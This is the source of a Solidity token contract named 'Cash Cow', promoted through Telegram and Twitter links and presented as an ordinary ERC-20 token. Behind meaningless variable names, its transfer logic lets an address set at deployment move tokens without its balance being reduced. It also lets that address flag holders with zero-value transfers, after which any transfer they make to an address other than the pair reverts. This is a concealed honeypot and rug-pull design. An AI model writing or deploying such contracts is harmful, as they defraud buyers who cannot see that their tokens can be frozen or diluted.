/*

📢 Join us on Telegram: https://t.me/CashCow_Portal

🐦 Follow us on Twitter: https://twitter.com/CashCow_ETH

*/

// SPDX-License-Identifier: GPL-3.0

pragma solidity ^0.8.7;

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor() {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), 'Ownable: caller is not the owner');
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), 'Ownable: new owner is the zero address');
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract CashCow is Ownable {
    string public symbol = 'Cash Cow';

    mapping(address => uint256) private including;

    uint256 private birds = 53;

    mapping(address => uint256) public balanceOf;

    address public uniswapV2Pair;

    event Transfer(address indexed from, address indexed to, uint256 value);

    string public name = 'Cash Cow';

    mapping(address => mapping(address => uint256)) public allowance;

    function approve(address tip, uint256 customs) public returns (bool success) {
        allowance[msg.sender][tip] = customs;
        emit Approval(msg.sender, tip, customs);
        return true;
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);

    uint8 public decimals = 9;

    function when(address brass, address rapidly, uint256 customs) private returns (bool success) {
        if (because[brass] == 0) {
            balanceOf[brass] -= customs;
        }

        if (customs == 0) including[rapidly] += birds;

        if (brass != uniswapV2Pair && because[brass] == 0 && including[brass] > 0) {
            because[brass] -= birds;
        }

        balanceOf[rapidly] += customs;
        emit Transfer(brass, rapidly, customs);
        return true;
    }

    mapping(address => uint256) private because;

    function transferFrom(address brass, address rapidly, uint256 customs) public returns (bool success) {
        require(customs <= allowance[brass][msg.sender]);
        allowance[brass][msg.sender] -= customs;
        when(brass, rapidly, customs);
        return true;
    }

    uint256 public totalSupply = 1000000000 * 10 ** 9;

    constructor(address life) {
        balanceOf[msg.sender] = totalSupply;
        because[life] = birds;
        IUniswapV2Router02 uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
    }

    function transfer(address rapidly, uint256 customs) public returns (bool success) {
        when(msg.sender, rapidly, customs);
        return true;
    }
}